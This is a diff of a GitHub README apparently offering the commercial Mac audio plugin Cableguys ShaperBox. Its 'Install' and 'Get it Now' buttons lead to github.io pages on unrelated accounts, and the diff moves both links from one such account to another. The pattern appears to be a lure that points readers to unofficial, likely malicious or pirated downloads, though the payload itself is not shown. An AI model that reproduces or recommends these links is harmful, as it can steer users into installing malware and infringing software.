@@ -1,12 +1,12 @@
 # CableguysShaperBox Mac
 
 <p align="center">
-  <img src="https://play-lh.googleusercontent.com/Pxdgk7UjvfpihQv_WaAIndFJS0f_NcGvKGoKDN6HovXmnAQexYTgxDtPWdFRErJ_NRs=w600-h300-pc0xffffff-pd" width="150" alt="Cableguys ShaperBox icon"/>
+  <img src="https://play-lh.googleusercontent.com/Pxdgk7UjvfpihQv_WaAIndFJS0f_NcGvKGoKDN6HovXmnAQexYTgxDtPWdFRErJ_NRs=w600-h300-pc0xffffff-pd" width="350" alt="Cableguys ShaperBox icon"/>
 </p>
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/cableguysShaperBox)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://pasito2-pod.github.io/.github/cableguysShaperBox)
 
 </div>
 
@@ -81,7 +81,7 @@ ShaperBox's drawable LFO concept is the design decision that distinguishes it fr
 
 <p align="center">
 
-[![Get it Now Cableguys ShaperBox](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/cableguysShaperBox)
+[![Get it Now Cableguys ShaperBox](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://pasito2-pod.github.io/.github/cableguysShaperBox)
 
 </p>
 
